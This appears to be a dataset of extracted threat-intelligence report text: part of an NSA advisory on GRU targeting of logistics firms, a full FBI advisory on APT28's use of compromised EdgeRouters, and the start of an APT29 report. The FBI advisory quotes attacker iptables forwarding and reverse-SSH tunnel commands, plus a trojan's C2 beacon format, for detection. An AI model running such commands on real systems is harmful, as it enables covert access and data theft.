Title ID Use Compromise Accounts: Email Accounts Compromise Accounts: Cloud Accounts Table 4: Initial Access T1586.002 Sent phishing emails using compromised accounts. T1586.003 Sent phishing emails using compromised accounts. Tactic/Technique Title ID Use Trusted Relationship T1199 Phishing T1566 Conducted follow-on targeting of additional entities in the transportation sector that had business ties to the primary target, exploiting trust relationships to attempt to gain additional access. Used spearphishing for credentials and delivering malware to gain initial access to targeted entities. Phishing: Spearphishing Attachment T1566.001 Sent emails with malicious attachments. Phishing: Spearphishing Link T1566.002 Phishing: Spearphishing Voice T1566.004 External Remote Services T1133 Used spearphishing with included links to fake login pages. Sent emails with embedded hyperlinks that downloaded a malicious archive. Attempted to use voice phishing to gain access to privileged accounts by impersonating IT staff. Exploited Internet-facing infrastructure, including corporate VPNs, to gain initial access to targeted entities. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 26 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Tactic/Technique Title ID Use Exploit Public-Facing Application Content Injection Table 5: Execution T1190 T1659 Exploited public vulnerabilities and SQL injection to gain initial access to targeted entities. Leveraged a WinRAR vulnerability allowing for the execution of arbitrary code embedded in an archive. Tactic/Technique Title ID Use User Execution: Malicious Link T1204.001 Used malicious links to hosted shortcuts in spearphishing. T1059 T1053.005 Used scheduled tasks to establish persistence. User Execution: Malicious File T1204.002 Delivered malware executables via spearphishing. Scheduled Task/Job: Scheduled Task Command and Scripting Interpreter Command and Scripting Interpreter: PowerShell Command and Scripting Interpreter: Windows Command Shell Command and Scripting Interpreter: Visual Basic Delivered scripts in spearphishing. Executed arbitrary shell commands. PowerShell commands were often used to prepare data for exfiltration. T1059.003 Used BAT script in spearphishing. T1059.005 Used VBScript in spearphishing. T1059.001 Command and Scripting Interpreter: Python T1059.006 Installed python on infected machines to enable the execution of Certipy. Table 6: Persistence Tactic/Technique Title ID Use Account Manipulation: Additional Email Delegate Permissions T1098.002 Used manipulation of mailbox permissions to establish sustained email collection. Modify Authentication Process: Multi-Factor Authentication T1556.006 Enrolled compromised accounts in MFA mechanisms to increase the trust-level of compromised accounts and enable sustained access. Used DLL search order hijacking to facilitate malware execution. T1574.001 Hijack Execution Flow: DLL Search Order Hijacking Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Boot or Logon Autostart Execution: Shortcut Modification Table 7: Defense Evasion T1547.001 Used run keys to establish persistence. T1547.009 Placed malicious shortcuts in the startup folder to establish persistence. Tactic/Technique Title ID Use Indicator Removal: Clear Windows Event Logs T1070.001 Deleted event logs through the wevtutil utility. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 27 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Table 8: Credential access Tactic/Technique Title ID Use Brute Force T1110 Brute Force: Password Guessing Brute Force: Password Spraying Multi-Factor Authentication Interception Input Capture T1110.001 T1110.003 T1111 T1056 Forced Authentication T1187 OS Credential Dumping: NTDS T1003.003 Unsecured Credentials: Group Policy Preferences T1552.006 Table 9: Discovery Sent requests with Base64-encoded credentials for the RTSP server, which included publicly documented default credentials, and likely were generic attempts to brute force access to the devices. Used credential guessing to gain initial access to targeted entities. Used brute force to gain initial access to targeted entities. Conducted a brute force password spray via LDAP. Used multi-stage redirectors to provide MFA relaying capabilities in some campaigns. Used multi-stage redirectors to provide CAPTCHA relaying capabilities in some campaigns. Used an Outlook NTLM vulnerability to collect NTLM hashes and credentials via specially crafted Outlook calendar appointment invitations. Attempted to dump Active Directory NTDS.dit domain databases. Retrieved plaintext passwords via Group Policy Preferences using Get-GPPPassword.py. Tactic/Technique Title ID Use Account Discovery: Domain Account T1087.002 Used a modified ldap-dump.py to enumerate the Windows environment. Table 10: Command and Control Tactic/Technique Title ID Use Hide Infrastructure T1665 Proxy: External Proxy T1090.002 Proxy: Multi-hop Proxy T1090.003 Encrypted Channel Multi-Stage Channels T1573 T1104 Abused SOHO devices to facilitate covert cyber operations, as well as proxy malicious activity, via devices with geolocation in proximity to the target. Actor-controlled servers sent RTSP DESCRIBE requests destined for RTSP servers. Used Tor and commercial VPNs as part of their anonymization infrastructure Connected to victim infrastructure using encrypted TLS. Used multi-stage redirectors for campaigns. Table 11: Defense evasion (mobile framework) Tactic/Technique Title ID Use Execution Guardrails T1627 Execution Guardrails: Geofencing T1627.001 Used multi-stage redirectors to verify browser fingerprints in some campaigns. Used multi-stage redirectors to verify IP-geolocation in some campaigns. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 28 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Table 12: Lateral movement Tactic/Technique Title ID Use Lateral Movement TA0008 Used native commands and open source tools, such as Impacket and PsExec, to move laterally within the environment. Remote Services: Remote Desktop Protocol Table 13: Collection T1021.001 Moved laterally within the network using RDP. Tactic/Technique Title ID Use Email Collection T1114 Retrieved sensitive data from email servers. Email Collection: Remote Email Collection T1114.002 Automated Collection Video Capture Archive Collected Data T1119 T1125 T1560 Archive Collected Data: Archive via Utility T1560.001 Table 14: Exfiltration Used server data exchange protocols and APIs such as Exchange Web Services (EWS) and IMAP to exfiltrate data from email servers. Used periodic EWS queries to collect new emails. Attempted to gain access to the cameras’ feeds. Accessed files were archived in .zip files prior to exfiltration. Prepared zip archives for upload to the actors’ infrastructure. Tactic/Technique Title ID Use Exfiltration Over Alternative Protocol Scheduled Transfer T1048 T1029 Attempted to exfiltrate archived data via a previously dropped OpenSSH binary. Used periodic EWS queries to collect new emails sent and received since the last data exfiltration. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 29 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Appendix B: CVEs exploited Table 15: Exploited CVE information CVE Vendor/Product Details CVE-2023-38831 RARLAB WinRAR CVE-2023-23397 Microsoft Outlook CVE-2021-44026 Roundcube Webmail CVE-2020-35730 Roundcube Webmail CVE-2020-12641 Roundcube Webmail Allows execution of arbitrary code when a user attempts to view a benign file within a ZIP archive. External actors could send specially crafted emails that cause a connection from the victim to an untrusted location of the actor’s control, leaking the Net-NTLMv2 hash of the victim that the actor could then relay to another service to authenticate as the victim. Roundcube before 1.3.17 and 1.4.x before 1.4.12 is prone to a potential SQL injection via search or search params. An XSS issue was discovered in Roundcube Webmail before 1.2.13, 1.3.x before 1.3.16 and 1.4.x before 1.4.10, where a plaintext email message with JavaScript in a link reference element is mishandled by linkref_addindex in rcube_string_replacer.php. Roundcube Webmail before 1.4.4 allows arbitrary code execution via shell metacharacters in a configuration setting for im_convert_path or im_identify_path in rcube_image.php. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 30 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Appendix C: MITRE D3FEND Countermeasures Table 16: MITRE D3FEND countermeasures Countermeasure Title ID Details Network Isolation D3-NI Access Mediation D3-AMED Inbound Traffic Filtering D3-ITF Resource Access Pattern Analysis Outbound Traffic Filtering D3-RAPA D3-OTF Platform Monitoring D3-PM System File Analysis D3-SFA Application Hardening D3-AH Application-based Process Isolation D3-ABPI Executable Allowlisting D3-EAL Execution Isolation D3-EI Application Configuration Hardening D3-ACH Process Spawn Analysis D3-PSA URL Reputation Analysis D3-URA Employ appropriate network segmentation. Disable Universal Plug and Play (UPnP), Peer-to-Peer (P2P), and Anonymous Visit features on IP cameras and routers. Limit access and utilize additional attributes (such as device information, environment, and access path) when making access decisions. Configure access controls carefully to ensure that only well-maintained and well- authenticated accounts have access. Implement host firewall rules to block connections from other devices on the network, other than from authorized management devices and servers, to prevent lateral movement. Use automated tools to audit access logs for security concerns and identify anomalous access requests. Block NTLM/SMB requests to external infrastructure. Install EDR/logging/cybersecurity solutions onto high value systems with large amounts of sensitive data such as mail servers and domain controllers. Collect and monitor Windows logs for certain events, especially for events that indicate that a log was cleared unexpectedly. Enable optional security features in Windows to harden endpoints and mitigate initial access techniques. Enable attack surface reduction rules to prevent executable content from email. Enable attack surface reduction rules to prevent execution of files from globally writeable directories, such as Downloads or %APPDATA%. Unless users are involved in the development of scripts, limit the execution of scripts (such as batch, JavaScript, and PowerShell) to known scripts. Disable Windows Host Scripting functionality and configure PowerShell to run in Constrained mode. Disable protocols that use weak authentication (e.g., clear-text passwords, or outdated and vulnerable authentication or encryption protocols) or do not support multi-factor authentication. Turn off other ports/services not in use (e.g., FTP, web interface, etc.). Use open source SIGMA rules as a baseline for detecting and alerting on suspicious file execution or command parameters. Use services that provide enhanced browsing services and safe link checking. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 31 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Network Access Mediation DNS Denylisting Domain Name Reputation Analysis Multi-factor Authentication Job Function Access Pattern Analysis User Account Permissions Token-based Authentication Credential Hardening Authentication Event Threshholding Strong Password Policy Credential Rotation D3-MFA D3-NAM D3-DNRA D3-JFAPA D3- DNSDL Do not allow incoming traffic, especially logins to systems, from public VPN services. Where possible, logins from public VPNs, including exit nodes in the same country as target systems, should be blocked or, if allowed, alerted on for further investigation. Ensure cameras and other Internet of Things devices are protected by a security appliance, if possible. Do not allow outgoing traffic to hosting and API mocking services frequently used by malicious actors. Heuristic detections for web requests to new subdomains may uncover malicious phishing activity. Logging the requests for each sub-domain requested by users on a network, such as in DNS or firewall logs, may enable system administrators to identify new targeting and victims. Use MFA with strong factors and require regular re- authentication, especially for management accounts. Implement other mitigations for privileged accounts: including limiting the number of admin accounts, considering using hardware MFA tokens, and regularly reviewing all privileged user accounts. Separate privileged accounts by role and alert on misuse of privileged accounts. Audit user accounts on all devices to ensure they are an accurate reflection of your organization and that they are being used as expected. Reduce reliance on passwords; instead, consider using services like single sign-on. Do not store passwords in Group Policy Preferences (GPP). Remove all passwords previously included in GPP and change all passwords on the corresponding accounts. Use account throttling or account lockout. Throttling progressively increases time delay between successive login attempts. If using account lockout, allow between 5 to 10 attempts before lockout. Use a service to check for compromised passwords before using them. D3-CRO Change all default credentials. D3-ANET D3-UAP D3-SPP D3-TBA D3-CH Encrypted Tunnels D3-ET Software Update D3-SU Agent Authentication D3-AA Disable protocols that use weak authentication (e.g., clear-text passwords, or outdated and vulnerable authentication or encryption protocols). Use a VPN for remote connections to devices. Apply security patches and firmware updates to all devices. Ensure devices are currently supported. Replace devices that are end-of-life. Ensure authentication is enabled for remote access to devices. If supported on IP cameras, enable authenticated RTSP access only. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 32 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR User Behavior Analysis D3-UBA Review all authentication activity for remote access to make sure it is valid and expected. Investigate any unexpected or unusual activity. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 33"
G0007_APT28,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0007_APT28/CSA-Russian-Actors-Use-Routers-Facilitate-Cyber_Operations.pdf,f08e64250c06,G0007,"Co-Authored by: TLP:CLEAR Product ID: JCSA-20240227-001 February 27, 2024 Russian Cyber Actors Use Compromised Routers to Facilitate Cyber Operations SUMMARY Actions EdgeRouter network defenders and users should implement to protect against APT28 activity: The Federal Bureau of Investigation (FBI), National Security Agency (NSA), US Cyber Command, and international partners are releasing this joint Cybersecurity Advisory (CSA) to warn of Russian state-sponsored cyber actors’ use of compromised Ubiquiti EdgeRouters (EdgeRouters) to facilitate malicious cyber operations worldwide. The FBI, NSA, US Cyber Command, and international partners – including authorities from Belgium, Brazil, France, Germany, Latvia, Lithuania, Norway, Poland, South Korea, and the United Kingdom -- assess the Russian General Staff Main Intelligence Directorate (GRU), 85th Main Special Service Center (GTsSS), also known as APT28, Fancy Bear, and Forest Blizzard (Strontium), have used compromised EdgeRouters globally to harvest credentials, collect NTLMv2 digests, proxy network traffic, and host spear-phishing landing pages and custom tools. passwords. Implement strategic firewall rules on WAN-side interfaces.  Perform a hardware factory reset.  Upgrade to the latest firmware version.  Change any default usernames and  The U.S. Department of Justice, including the FBI, and international partners recently disrupted a GRU botnet consisting of such routers. However, owners of relevant devices should take the remedial actions described below to ensure the long-term success of the disruption effort and to identify and remediate any similar compromises. To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or submit a report to the FBI Internet Crime Complaint Center (IC3). When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.cisa.gov/tlp/. TLP:CLEAR TLP:CLEAR TECHNICAL DETAILS Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. Overview This advisory provides observed tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and recommendations to mitigate the threat posed by APT28 threat actors related to compromised EdgeRouters. Given the global popularity of EdgeRouters, the FBI and its international partners urge EdgeRouter network defenders and users to apply immediately the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of cybersecurity incidents associated with APT28 activity. Ubiquiti EdgeRouters have a user-friendly, Linux-based operating system that makes them popular for both consumers and malicious cyber actors. EdgeRouters are often shipped with default credentials and limited to no firewall protections to accommodate wireless internet service providers (WISPs). Additionally, EdgeRouters do not automatically update firmware unless a consumer configures them to do so. Threat Actor Activity As early as 2022, APT28 actors had utilized compromised EdgeRouters to facilitate covert cyber operations against governments, militaries, and organizations around the world. These operations have targeted various industries, including Aerospace & Defense, Education, Energy & Utilities, Governments, Hospitality, Manufacturing, Oil & Gas, Retail, Technology, and Transportation. Targeted countries include Czech Republic, Italy, Lithuania, Jordan, Montenegro, Poland, Slovakia, Turkey, Ukraine, United Arab Emirates, and the US[1][2]. Additionally, the actors have strategically targeted many individuals in Ukraine. An FBI investigation revealed APT28 actors accessed EdgeRouters compromised by Moobot, a botnet that installs OpenSSH trojans on compromised hardware [T1588]. While the compromise of EdgeRouters has been documented in open-source reporting, FBI investigation revealed each compromised router accessed by APT28 actors housed a collection of Bash scripts and ELF binaries designed to exploit backdoor OpenSSH daemons and related services [T1546] for a variety of purposes. APT28 actors have used compromised EdgeRouters to collect credentials, proxy network traffic, and host spoofed landing pages and custom post-exploitation tools. For example, in early 2023, APT28 actors authored custom Python scripts to collect account credentials for specifically targeted webmail users. APT28 actors uploaded these custom Python scripts [T1587] to a subset of compromised Ubiquiti routers to validate stolen webmail account credentials collected via cross-site scripting and browser-in-the-browser spear-phishing campaigns [T1566]. Page 2 of 8 | Product ID: JCSA-20240227-001 TLP:CLEAR TLP:CLEAR Additionally, an FBI investigation revealed that as early as 2022, APT28 actors had exploited CVE- 2023-23397, a zero-day vulnerability at the time, to collect NTLMv2 digests from targeted Outlook accounts [T1203]. Per a Microsoft blog post[3] published in March 2023, CVE-2023-23397 is a critical elevation of privilege vulnerability in Microsoft Outlook on Windows wherein Net-NTLMv2 hashes are leaked to actor-controlled infrastructure [T1119, T1020]. Despite Microsoft releasing a patch for the vulnerability, FBI investigation revealed APT28 actors have continued to exploit CVE-2023-23397 to leak NTLM digests to actor controlled infrastructure. APT28 actors have installed publicly available tools such as Impacket ntlmrelayx.py[4] and Responder[5] on compromised Ubiquiti routers to execute NTLM relay attacks [T1557] and host NTLMv2 rogue authentication servers [T1556]. In summary, with root access to compromised Ubiquiti EdgeRouters, APT28 actors have unfettered access to Linux-based operating systems to install tooling and to obfuscate their identity while conducting malicious campaigns. Indicators of Compromise The FBI identified IOCs for the Moobot OpenSSH trojan and for APT28 activity on EdgeRouters. Readers of this CSA can reference the observations below to determine if their EdgeRouters have been impacted by either party. Moobot OpenSSH Trojan APT28 actors have leveraged default credentials and trojanized OpenSSH server processes to access EdgeRouters. Trojanized OpenSSH server processes are associated with Moobot, a Mirai- based botnet that infects internet of things (IoT) devices using remotely exploitable vulnerabilities, such as weak or default passwords. Trojanized OpenSSH server binaries downloaded from packinstall[.]kozow[.]com replaced legitimate binaries on EdgeRouters accessed by APT28, allowing remote attackers to bypass authentication. Credential Access via Python Scripts APT28 actors have hosted custom Python scripts on compromised EdgeRouters to collect and validate stolen webmail account credentials. The scripts are typically stored alongside related log files in the home directory of a compromised user, e.g., /home/<compromised user>/srv/core.py and /home/<compromised user>/srv/debug.txt. The FBI has recovered verbose log files with information about APT28 activity on EdgeRouters. File name core.py core.py SHA-256 4E32B04930D1F745EBA92255EE1C5E5AC82B939FF12DE0522C8A4905431D033D C51C6AA0230A2FEA888EBCD213D302F1CC9F6051FDB268AE5C7A09415845C404 Network defenders can use the FBI-created Yara rule below to locate credential collection scripts on compromised EdgeRouters. Additionally, they can query network traffic for connections with API endpoint api[.]anti-captcha[.]com, which APT28 actors use in their custom Python scripts to automatically break captcha problems on webmail login pages. rule APT28_core_scripts { strings: $a = ""make_response('BAD')"" $b = ""make_response('Finaly')"" Page 3 of 8 | Product ID: JCSA-20240227-001 TLP:CLEAR TLP:CLEAR $c = ""make_response('NOOP')"" $d = ""api.anti-captcha.com"" $e = ""messages/remove"" $f = ""acbb64c3de5ea5e5936df4a1eecf1235"" condition: 5 of them } Exploitation of CVE-2023-23397 APT28 actors have used ntlmrelayx.py and Responder to facilitate NTMLv2 credential leaks via exploitation of CVE-2023-23397 as a zero-day vulnerability since early 2022. The FBI collected evidence of APT28 CVE-2023-23397 activity on numerous compromised EdgeRouters. With default configurations, Responder logs activity to the following files: - Responder-Session.log, and - Responder.db. Network defenders and users can search EdgeRouters for tooling associated with ntlmrelayx.py and Responder to identify APT28 activity. Proxy and Tunnel Infrastructure APT28 actors have used iptables rules on EdgeRouters to establish reverse proxy connections to dedicated infrastructure. Readers of this CSA can review iptables chains and Bash histories on EdgeRouters for unusual invocations like the example provided below. iptables -t nat -I PREROUTING -d <router IP address> -p tcp -m tcp --dport 4443 - j DNAT -to-destination <APT28 dedicated infrastructure>:10081 Additionally, APT28 actors have uploaded adversary-controlled SSH RSA keys to compromised EdgeRouters to establish reverse SSH tunnels and access compromised devices. Readers of this CSA can review /root/.ssh/ and other .ssh/ directories under /home/ for unknown RSA keys, which adversaries have used to access EdgeRouters despite password changes. Readers can also query network traffic logs on EdgeRouters to identify abnormal SSH sessions. An invocation of a reverse SSH tunnel used by APT28 actors is included below. ssh –i <RSA key> -p <port> root@<router IP address> -R <router IP address>:<port> MASEPIE Malware In December 2023, APT28 actors wrote MASEPIE[6], a small Python backdoor capable of executing arbitrary commands on victim machines. An FBI investigation revealed that on more than one occasion, APT28 used compromised Ubiquiti EdgeRouters as command-and-control infrastructure for MASEPIE backdoors deployed against targets. Data sent to and from the EdgeRouters was encrypted using a randomly generated 16-character AES key. It is important to note that APT28 does not deploy MASEPIE on EdgeRouters, but rather on systems belonging to targeted individuals and organizations. Page 4 of 8 | Product ID: JCSA-20240227-001 TLP:CLEAR TLP:CLEAR SHA-256 for MASEPIE backdoors 40a7fd89b9e51b0a515ac2355036d203357be90a2200b9c506b95c12db54c7aa 18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6 0429bdc6a302b4288aea1b1e2f2a7545731c50d647672fa65b012b2a2caa386e DETECTION To locate related, malicious files on EdgeRouters, search Bash histories of all users for file downloads from domain packinstall[.]kozow[.]com, query network traffic for connections with domain packinstall[.]kozow[.]com, and reference the file hash table below to locate artifacts on disk. Additionally, if directory /usr/lib/libu.a/ exists on an EdgeRouter, it is likely an infection occurred. SHA-256 File path 3B5ED45345193B06F40515DA342FF146267E8340B2E1AB6D55A257D2E3554A2B /usr/sbin/cl ADAE1BD8938B9A0D825A2EF7E7C4E000F01966C397306027119F20D7ECCE955D /usr/sbin/cl C09F8D0A9FA0F9BB3E19556182A95782DAEC2F2F532CAB5EEB5528F2CD783583 /usr/sbin/cts /usr/sbin/env 1CC20155517860557C94308EC913E4C3BFC072C34CE33449641CC9FB1D571B21 /usr/sbin/events 551EB82D82B7A8830549C9183EB39ACF19719C84B9BCCC7FB443504B093F6BB9 /usr/sbin/events CD83DD9470603B1A1951EEFA95B602E34207C4D5E62C649642E7160574A9C50D /usr/sbin/events FBC2E6820C874ED102BAB304382EDEFFB9708E7B8445E126C227A6C289D92708 C9E06C7C62395DA32C91CC0C4ACB95F29A0AA3380A833E7C7B24B8D4DB50C0C6 /usr/sbin/ptty 5FACBE53B4C63DBC865F3713385358DF490A4BAD9211337241D85F0554CCA40A /usr/sbin/ptty C7C40CDCDD65E468EE29D330A34E8EE94C26AA8B3F1830E0A8DFEA8ACA3CDD50 /usr/sbin/ptty A4A95807F1C5B200D5D94E3E811A7C4AF2D0D9CA88CA4D7F9D02015574F4716F /usr/sbin/sshd 104E3EA9A190BA039488F5200824FE883B98F6FE01D05A1B55E15ED2199C807A /usr/sbin/sshd Some versions of the OpenSSH trojan create malicious users systemd and systemx in /etc/shadow and /etc/passwd on infected EdgeRouters. The trojan also introduces an OpenDNS server IP address in /etc/resolv.conf, 208[.]67[.]220[.]222, and a user-land process named .kworker to masquerade as a legitimate kernel thread. Network defenders can also query network traffic for connections with the following domains, which were identified by the FBI and are associated with the OpenSSH trojan. HTTP beacons to these domains follow the form provided after the list. - matbaiteahe[.]mooo[.]com - lalapoc[.]kozow[.]com - gneivaientga[.]ignorelist[.]com - antotehlant[.]theworkpc[.]com - onechoice[.]gleeze[.]com - mumucnc[.]kozow[.]com <C2_DOMAIN>/srv.php?type=${type}&ip=${ip}&sshd_port=${sshd_port}&sshd_backup_miss ing=${sshd_backup_missing}&sshkey=${SSHKEY}&ptty_ver=${ptty_ver}&ctry=${CTRY}&id_ unic=${id_unic}&os=${os}&arch=${arch}&kernel=${kernel}&upt=${upt}&serverspeed=${s erverspeed}&lan=${lan}&lan_ip=${lan_ip}&rk_date=${rk_date}&socks_value=${socks_va lue} Page 5 of 8 | Product ID: JCSA-20240227-001 TLP:CLEAR TLP:CLEAR EdgeRouters compromised by the OpenSSH trojan display a unique SSH identification string, SSH- 2.0-OpenSSH_6.7p2. Use Netcat or similar tools to collect identification strings from EdgeRouters and other hardware to locate infections. (local) $ nc <IP address of EdgeRouter> <SSH listening port on EdgeRouter> SSH-2.0-OpenSSH_6.7p2 # this version indicates infection. Additionally, query repositories of banners collected from internet hosts, e.g., Shodan or Censys, to locate EdgeRouters infected by the OpenSSH trojan. An example Censys query is provided below. The EdgeOS portion of the query can be negated to return other types of devices infected by the trojan. services.software.uniform_resource_identifier: `cpe:2.3:a:openbsd:openssh:6.7p2*` and services.software.uniform_resource_identifier: `cpe:2.3:o:ui:edgeos*` MITRE ATT&CK TACTICS AND TECHNIQUES See Tables 1-7 for all referenced threat actor tactics and techniques in this advisory. Table 1: APT28 ATT&CK Techniques for Resource Development Technique Title ID Use Develop Capabilities T1587 Obtain Capabilities T1588 APT28 threat actors authored custom Python scripts to collect account credentials for specifically targeted webmail users. APT28 actors accessed EdgeRouters compromised by Moobot, a botnet that installs OpenSSH trojans on compromised hardware. Table 2: APT28 ATT&CK Techniques for Initial Access Technique Title ID Use Compromise Infrastructure Phishing T1584 T1566 APT28 threat actors have accessed EdgeRouters previously compromised by an OpenSSH trojan. APT28 threat actors conducted cross-site scripting and browser-in-the-browser spear-phishing campaigns. Table 3: APT28 ATT&CK Techniques for Execution Technique Title ID Use Exploitation for Client Execution T1203 APT28 threat actors exploited CVE-2023-23397. Table 4: APT28 ATT&CK Techniques for Persistence Technique Title ID Use Page 6 of 8 | Product ID: JCSA-20240227-001 TLP:CLEAR TLP:CLEAR Event Triggered Execution T1546 The compromised router housed a collection of Bash scripts and ELF binaries designed to backdoor OpenSSH daemons and related services. Table 5: APT28 ATT&CK Techniques for Credential Access Technique Title ID Use Adversary-in-the- Middle Modify Authentication Process T1557 T1556 APT28 threat actors installed publicly available tools Impacket ntlmrelayx.pyvi and Respondervii on compromised Ubiquiti routers to execute NTLM relay attacks. ATP28 threat actors hosted NTLMv2 rogue authentication servers to modify authentication process from stolen credential collected during the NTLM relay attacks. Table 6: APT28 ATT&CK Techniques for Collection Technique Title ID Use Automated Collection T1119 APT28 utilizes CVE-2023-23397 to automate NTLMv2 hash collection. Table 7: APT28 ATT&CK Techniques for Exfiltration Technique Title ID Automated Exfiltration T1020 Use APT28 utilizes CVE-2023-23397 to automate exfiltration to actor-controlled infrastructure. MITIGATIONS Rebooting a compromised EdgeRouter will not remove the existing malware of concern, if present. The FBI and its partners recommend the following steps be taken to remediate compromised EdgeRouters: 1. Perform a hardware factory reset to flush file systems of malicious files, 2. Upgrade to the latest firmware version, 3. Change any default usernames and passwords, and 4. Implement strategic firewall rules on WAN-side interfaces to prevent the unwanted exposure of remote management services. Additionally, all network owners should keep their operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. For CVE-2023-23397, updating Microsoft Outlook mitigates the vulnerability. To mitigate other forms of NTLM relay, all network owners should consider disabling NTLM when feasible, or enabling server signing and Extended Protection for Authentication configurations[7]. Page 7 of 8 | Product ID: JCSA-20240227-001 TLP:CLEAR TLP:CLEAR Further, for longer term mitigations, network owners should prioritize only using routers and other equipment incorporating secure-by-design principles that eliminate default passwords and SOHO router defects. REPORTING The FBI seeks any information or evidence of APT28 activity on compromised EdgeRouters. This information provides the FBI with the critical information it needs to deter continued use of such techniques and to hold threat actors accountable under United States law. The FBI encourages organizations and individuals to report information concerning suspicious or criminal activity to their local FBI field office, or the FBI’s Internet Crime Complaint Center (IC3). When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. REFERENCES [1] Mandiant: Campaign 23.056: Suspected Espionage Group with Russia Nexus Conducts Phishing Campaign for Credential Harvesting [2] Mandiant: Campaign 23.021: Suspected Espionage Group with Russia Nexus Targeted Multiple Organizations and Governments with CVE-2023-23397 [3] Microsoft: Guidance For Investigating Attacks Using CVE 2023-23397 [4] Github: Fortra/impacket [5] Github: lgandx/Responder [6] CERT-Ukraine: APT28: From Initial Damage to Domain Controller Threats in an Hour (CERT- UA#8399) [7] Microsoft: Overview of Server Message Block Signing DISCLAIMER The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies. ACKNOWLEDGEMENTS Mandiant and Microsoft Threat Intelligence contributed to this advisory. VERSION HISTORY February 27, 2024: Initial version Page 8 of 8 | Product ID: JCSA-20240227-001 TLP:CLEAR"
G0016_APT29,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0016_APT29/Russia - APT29 _ NJCCIC.pdf,08376118be65,G0016,"11/8/25, 4:24 PM Russia - APT29 | NJCCIC I WANT TO... Russia - APT29 Executive Summary APT29, also known as Cozy Bear, Midnight Blizzard, The Dukes, Dark Halo, and NobleBaron, is a Russian state- sponsored cyber group linked to the Foreign Intelligence Service (SVR). APT29 has recently advanced its tradecraft by leveraging legitimate cloud services and Software-as-a-Service (SaaS) platforms to conduct covert, highly targeted cyber espionage campaigns. Their operations have primarily focused on Western governments, diplomatic entities, and critical infrastructure. This shift toward cloud-native techniques allows their activity to blend into normal network traffic, significantly reducing the effectiveness of traditional security tools. This evolution is part of a broader trend among nation-state actors using “living off the land” techniques to evade detection and maintain long-term access to compromised environments. As geopolitical tensions continue to rise, organizations in targeted sectors must reassess their cloud security posture and detection strategies to defend against increasingly stealthy and persistent threats like APT29. Key Points APT29 is a Russian state-sponsored cyber-espionage group linked to the SVR, known for targeting Western governments, diplomatic missions, non-governmental organizations (NGO), and critical infrastructure. The group has expanded its operations with a focus on persistent, highly targeted intelligence-gathering campaigns. APT29 increasingly leverages legitimate cloud and SaaS platforms to conduct operations that blend into regular network activity, making detection more difficult. These evolving tactics weaken traditional security models and increase risk for organizations dependent on cloud infrastructure, requiring improved behavioral monitoring and detection capabilities. Risk Assessment The NJCCIC has assessed that APT29 poses a significant and growing threat to organizations that manage sensitive government, diplomatic, or infrastructure data. The group can maintain covert, long-term access while evading conventional detection tools by abusing legitimate cloud services and employing ""living off the land"" (LOTL) techniques. This shift is especially concerning for cloud-dependent organizations with limited visibility into user behavior and identity activity. APT29 has previously targeted sectors such as government and critical infrastructure and has deployed malware linked to earlier detections in similar environments. These tactics align with common gaps in https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 1/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC cloud and identity security postures, increasing the likelihood of successful intrusions and reinforcing the need for immediate improvements in detection and response capabilities. Threat Actor Summary APT29, associated with the SVR, primarily targets government, diplomatic, non-governmental, and critical infrastructure sectors in countries such as the United States (US), the United Kingdom, NATO members, and other Western allies. Since 2008, the group has been actively tracked by the cybersecurity community and remains a key player in Russia’s foreign intelligence operations. Technical Analysis Tactics, Techniques, & Procedures APT29 is known for its covert and persistent cyber-espionage campaigns. The group typically gains access through spearphishing attacks and, more recently, by compromising cloud identity systems and using stolen credentials to infiltrate cloud environments, often without deploying malware. Inside networks, the group relies on legitimate tools like PowerShell, Windows Management Instrumentation (WMI), and LOTL techniques to evade detection. While APT29 has used custom malware such as WellMess and 